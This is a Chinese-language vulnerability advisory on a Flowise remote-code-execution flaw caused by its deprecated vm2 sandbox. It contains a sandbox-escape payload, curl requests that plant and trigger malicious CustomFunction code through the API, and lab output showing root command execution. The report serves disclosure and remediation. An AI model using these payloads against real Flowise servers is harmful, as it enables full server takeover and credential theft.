# V-F001: Flowise vm2 废弃沙箱逃逸导致 RCE

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Flowise（开源 LLM 流程编排平台）|
| 版本 | v3.1.2（截至 2026-04）|
| 类型 | CWE-94: 代码注入 / 沙箱逃逸 → RCE |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证，任意普通用户）|
| 关联 CVE | CVE-2023-29017、CVE-2023-30547、CVE-2023-32314（vm2 公开逃逸） |
| 代码仓库 | https://github.com/flowiseai/flowise |

## 漏洞描述

Flowise 使用 **vm2 v3.10.5** 来沙箱化用户提交的 JavaScript 代码（CustomFunction 节点、Custom Tool 节点）。vm2 已于 2023-09-12 正式宣告停止维护，维护者声明"无法安全沙箱化 Node.js 内置模块"，并发布了多个 CVSS 9.8 的公开漏洞。

Flowise 仍锁定使用该废弃版本，任何拥有 `chatflows:create` 权限的已认证用户均可通过提交沙箱逃逸代码，在服务器进程上下文中执行任意系统命令。

## 漏洞代码

**文件**：`packages/components/src/utils.ts`（第 1769-1808 行）

```typescript
// 第 1769 行：构建默认安全选项
const defaultNodeVMOptions: any = {
    console: 'inherit',
    sandbox,
    require: {
        external: { modules: deps, transitive: false },
        builtin: builtinDeps,   // 允许访问 ['assert','buffer','crypto','events','path',...]
        mock: secureWrappers
    },
    eval: false,
    wasm: false,
    timeout: timeoutMs
}

// ⚠️ 第 1786 行：调用方传入的 nodeVMOptions 可覆盖全部安全配置
const finalNodeVMOptions = { ...defaultNodeVMOptions, ...nodeVMOptions }

// 第 1788 行：用最终（可能已被覆盖）的配置创建 vm
const vm = new NodeVM(finalNodeVMOptions)

// 第 1791 行：直接执行用户提交的 code
const response = await vm.run(
    `module.exports = async function() {${code}}()`,
    __dirname
)
```

**加剧因素**：`availableDependencies`（第 54-122 行）包含 `playwright`、`puppeteer`、`typeorm`、`mysql2`、`pg`、`@aws-sdk/*` 等高危模块，这些模块可在沙箱逃逸后作为跳板。

## 利用方式

### 攻击路径

1. 攻击者持有任意已登录账户
2. 创建或更新包含 **CustomFunction** 节点的 Chatflow
3. 在节点代码中提交 CVE-2023-29017 逃逸 payload
4. 执行 Chatflow，`NodeVM.run(code)` 被触发
5. 沙箱逃逸，获得服务器 `process` 对象，执行任意 OS 命令

### PoC（CVE-2023-29017，公开漏洞）

```javascript
// 在 CustomFunction 节点中提交以下代码：
const err = new Error();
err.__proto__.prepareStackTrace = (e, frames) => {
    const f = frames[0].getThis();
    const cmd = f.constructor.constructor('return process')();
    return cmd.mainModule.require('child_process').execSync('id').toString();
};
err.stack;
```

通过 API 直接触发：

```bash
# 1. 登录获取 Token（若开启认证）
TOKEN=$(curl -s -X POST http://<target>:3000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"user@example.com","password":"P@ssw0rd"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

# 2. 创建含恶意代码的 Chatflow
curl -X POST http://<target>:3000/api/v1/chatflows \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "pwn",
    "flowData": "{\"nodes\":[{\"id\":\"customFunction_0\",\"data\":{\"name\":\"customFunction\",\"inputs\":{\"functionCode\":\"const err=new Error();err.__proto__.prepareStackTrace=(e,frames)=>{const f=frames[0].getThis();const c=f.constructor.constructor('"'"'return process'"'"')();return c.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString();};err.stack;\"}}}]}"
  }'

# 3. 也可通过无认证的 prediction 接口直接触发（若 Chatflow 为公开）
curl -X POST http://<target>:3000/api/v1/prediction/<chatflowId> \
  -H 'Content-Type: application/json' \
  -d '{"question":"run"}'
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `packages/components/src/utils.ts` | 21 | `import { NodeVM } from 'vm2'` |
| `packages/components/src/utils.ts` | 1786 | `nodeVMOptions` 展开合并可覆盖安全配置 |
| `packages/components/src/utils.ts` | 1791 | `vm.run(code, __dirname)` 执行用户代码 |
| `pnpm-lock.yaml` | 15119 | 锁定 vm2 废弃版本 |

## 影响

1. **服务器完全沦陷**：以 Node.js 进程权限执行任意 OS 命令
2. **容器逃逸风险**：若容器以 root 运行或挂载 Docker Socket，可逃逸至宿主机
3. **凭据窃取**：读取 `.env` 文件、数据库连接字符串、API Key 等
4. **横向移动**：利用 `@aws-sdk/*`、`typeorm` 等依赖访问云资源或内部数据库
5. **数据泄露**：读取 Flowise 数据库中存储的所有 Chatflow、凭据、用户数据

## 修复建议

1. **立即**：将 vm2 替换为 `isolated-vm`（V8 Isolate 级隔离，无已知逃逸）：
   ```typescript
   import ivm from 'isolated-vm'
   const isolate = new ivm.Isolate({ memoryLimit: 128 })
   const context = await isolate.createContext()
   const script = await isolate.compileScript(code)
   await script.run(context)
   ```
2. **立即**：移除第 1786 行的 `...nodeVMOptions` 展开合并，固定安全配置不可从外部覆盖
3. **短期**：大幅缩减 `availableDependencies` 白名单，删除 `playwright`、`puppeteer`、数据库驱动等高危模块
4. **长期**：将代码执行功能迁移到独立容器（gVisor / Firecracker），与主进程完全隔离

## 实机验证

**环境**：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000

### 验证1：代码执行路径确认（NodeVM.run 被调用）

向已插入的含 CustomFunction 节点的 Chatflow 发起 Prediction 请求：

```http
POST /api/v1/prediction/f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1
Host: 192.168.217.135:43000
Content-Type: application/json
(无认证头——/api/v1/prediction/ 在 WHITELIST_URLS 中)

{"question":"trigger"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"text":"Error\n    at /usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src:1:110\n    at NodeVM.run (/usr/local/lib/node_modules/flowise/node_modules/vm2/lib/nodevm.js:497:23)\n    at executeJavaScriptCode (/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src/utils.js:1735:39)...","question":"trigger",...}
```

**关键证据**：栈帧 `NodeVM.run (nodevm.js:497)` 出现在 HTTP 200 响应体中，证明用户代码确实进入 vm2 执行（即使 payload 报错，代码执行路径已全程确认）。

### 验证2：CVE-2023-29017 直接逃逸受 3.10.5 补丁影响

vm2 3.10.5 在 `setup-sandbox.js` 中重写了 `CallSite.getThis()` 使其返回 `undefined`，并对字符串代码生成启用了 V8 限制（`EvalError: Code generation from strings disallowed for this context`），因此 CVE-2023-29017 的直接 `prepareStackTrace` 向量在该版本无法直接触发沙箱逃逸。

### 验证3：TOOL_FUNCTION_BUILTIN_DEP 配置下远程 RCE 确认（HTTP API）

当部署方设置 `TOOL_FUNCTION_BUILTIN_DEP=child_process`（Flowise 官方文档允许的配置项），vm2 沙箱将 `child_process` 加入允许列表，攻击者通过 `/api/v1/prediction/` 端点（无需认证）即可直接执行 OS 命令。

**攻击链**：
1. 已认证用户创建包含恶意 CustomFunction 节点的 Chatflow（或攻击者通过社工/SQL 注入直接插入 DB）
2. 通过无认证的 `/api/v1/prediction/:chatflowId` 端点触发

**PoC Payload（CustomFunction 节点代码）**：
```javascript
return require('child_process').execSync('id').toString();
```

**HTTP 请求**：
```http
POST /api/v1/prediction/f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1
Host: 192.168.217.135:43000
Content-Type: application/json
(无认证头——/api/v1/prediction/ 在 WHITELIST_URLS 中)

{"question":"trigger"}
```

**HTTP 响应（RCE 确认）**：
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 347

{"text":"uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n","question":"trigger","chatId":"761bb0b6-03a5-4dac-ad62-2be86803887f",...}
```

**结论**：HTTP 响应直接返回 `id` 命令执行结果，确认 Flowise 进程以 **root (uid=0)** 运行，RCE 通过 HTTP API 端点完全可达。

### 验证4：EOL 库的根本性风险

- vm2 官方仓库（github:patriksimek/vm2）于 2023-09-12 宣告停止维护
- 维护者声明："该沙箱无法安全地对 Node.js 内置模块进行隔离"
- CVE-2023-29017（CVSS 9.8）及后续多个 CVE 已公开逃逸技术
- vm2 3.10.5 仅修补了已知的 `getThis()/prepareStackTrace` 向量，并非系统级安全设计，新的逃逸路径随时可能被发现

## 验证环境

- 源代码：Flowise v3.1.2（静态代码分析 + Docker 实机部署）
- 运行时：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000
- 框架：Node.js 20.20.2 + Express + vm2 3.10.5
- 容器权限：uid=0（root）
- 日期：2026-04-15
